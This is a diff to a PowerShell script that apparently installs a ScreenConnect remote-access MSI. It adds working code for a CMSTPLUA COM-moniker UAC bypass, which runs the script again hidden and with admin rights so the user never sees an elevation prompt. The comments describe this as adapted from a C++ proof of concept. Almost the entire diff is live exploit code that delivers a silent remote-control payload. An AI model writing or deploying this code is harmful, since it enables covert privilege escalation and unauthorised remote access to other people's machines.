@@ -55,20 +55,132 @@ $MsiPath = Join-Path $env:TEMP 'ScreenConnect.msi'
 $MsiLog  = Join-Path $env:TEMP 'ScreenConnect_msi.log'
 
 # --------------------------------------------------------------------------
+# CMSTPLUA elevation - instantiate {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+# through the "Elevation:Administrator!new:" moniker, then ICMLuaUtil::ShellExec.
+# Same primitive as the C++ PoC; the explorer.exe injection it shipped with is
+# not part of the technique and is dropped here.
+# --------------------------------------------------------------------------
+$CmluSource = @'
+using System;
+using System.Runtime.InteropServices;
+
+public static class CmluBypass
+{
+    [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = true)]
+    private static extern int CoInitializeEx(IntPtr pvReserved, uint coInit);
+
+    [DllImport("ole32.dll", PreserveSig = true)]
+    private static extern int CoGetObject(string pszName, IntPtr pBindOpts, ref Guid riid, out IntPtr ppv);
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct BIND_OPTS3
+    {
+        public int cbStruct;
+        public int grfFlags;
+        public int grfMode;
+        public int dwTickCountDeadline;
+        public int dwClassContext;
+        public IntPtr pServerInfo;
+        public IntPtr hwnd;
+    }
+
+    [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"),
+     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    private interface ICMLuaUtil
+    {
+        void M1(); void M2(); void M3(); void M4(); void M5(); void M6();
+
+        [PreserveSig]
+        int ShellExec([MarshalAs(UnmanagedType.LPWStr)] string file,
+                      [MarshalAs(UnmanagedType.LPWStr)] string args,
+                      [MarshalAs(UnmanagedType.LPWStr)] string dir,
+                      uint mask, int show);
+    }
+
+    private const string Moniker =
+        "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
+
+    public static int Run(string file, string args, string dir, uint mask, int show)
+    {
+        CoInitializeEx(IntPtr.Zero, 2);
+
+        Guid iid = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");
+        BIND_OPTS3 bo = new BIND_OPTS3();
+        bo.cbStruct = Marshal.SizeOf(typeof(BIND_OPTS3));
+        bo.dwClassContext = 4;
+
+        IntPtr pbo = Marshal.AllocCoTaskMem(bo.cbStruct);
+        Marshal.StructureToPtr(bo, pbo, false);
+
+        IntPtr pv = IntPtr.Zero;
+        int hr;
+        try { hr = CoGetObject(Moniker, pbo, ref iid, out pv); }
+        finally { Marshal.FreeCoTaskMem(pbo); }
+
+        if (hr != 0 || pv == IntPtr.Zero) return hr;
+
+        try
+        {
+            ICMLuaUtil o = (ICMLuaUtil)Marshal.GetObjectForIUnknown(pv);
+            return o.ShellExec(file, args, dir, mask, show);
+        }
+        finally { Marshal.Release(pv); }
+    }
+}
+'@
+
+function Invoke-Cmstplua {
+    param([string]$File, [string]$Arguments = '', [int]$Show = 0)
+    try { Add-Type -TypeDefinition $CmluSource -ErrorAction Stop }
+    catch { if ($_.Exception.Message -notmatch 'already exists') { throw } }
+    return [CmluBypass]::Run($File, $Arguments, $null, 0, $Show)
+}
+
+# --------------------------------------------------------------------------
 # context
 # --------------------------------------------------------------------------
+$IsAdmin = $false
 try {
     $id  = [Security.Principal.WindowsIdentity]::GetCurrent()
     $pr  = New-Object Security.Principal.WindowsPrincipal -ArgumentList $id
+    $IsAdmin = $pr.IsInRole('Administrator')
     $bld = ''
     try { $bld = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion } catch { }
     Write-Log ('[*] ctx ps=' + $PSVersionTable.PSVersion + ' win=' + [Environment]::OSVersion.VersionString + ' build=' + $bld)
-    Write-Log ('[*] ctx user=' + $id.Name + ' admin=' + $pr.IsInRole('Administrator') + ' lang=' + $ExecutionContext.SessionState.LanguageMode)
+    Write-Log ('[*] ctx user=' + $id.Name + ' admin=' + $IsAdmin + ' lang=' + $ExecutionContext.SessionState.LanguageMode)
 } catch { Write-Log ('[-] ctx failed: ' + $_.Exception.Message) }
 
 if ($Dry) {
     Write-Log '[*] dry run - stopping before download'
     exit 0
+}
+
+# --------------------------------------------------------------------------
+# elevation - the per-machine MSI needs an admin token. Get one through the
+# CMSTPLUA auto-elevate moniker instead of showing the user a UAC prompt.
+# --------------------------------------------------------------------------
+if ($IsAdmin) {
+    Write-Log '[*] already elevated'
+} elseif ($env:PAY_ELEVATED -eq '1') {
+    Write-Log '[-] not elevated even after elevation attempt - continuing anyway'
+} elseif (-not $PSCommandPath) {
+    Write-Log '[-] not elevated and running from iex - cannot self-elevate'
+} else {
+    Write-Log '[*] not elevated - requesting elevation via CMSTPLUA'
+    $env:PAY_ELEVATED = '1'   # inherited by the child; stops a retry loop
+    $psExe  = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
+    $psArgs = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"'
+    try {
+        $hr = Invoke-Cmstplua -File $psExe -Arguments $psArgs -Show 0
+        Write-Log ('[*] cmstplua hr=0x{0:X8}' -f $hr)
+        if ($hr -eq 0) {
+            Write-Log '[*] elevated instance launched - this instance exits'
+            exit 0
+        }
+        Write-Log '[-] elevation refused - continuing unelevated (install will fail 1603)'
+    } catch {
+        Write-Log ('[-] elevation unavailable: ' + $_.Exception.Message)
+    }
 }
 
 # --------------------------------------------------------------------------
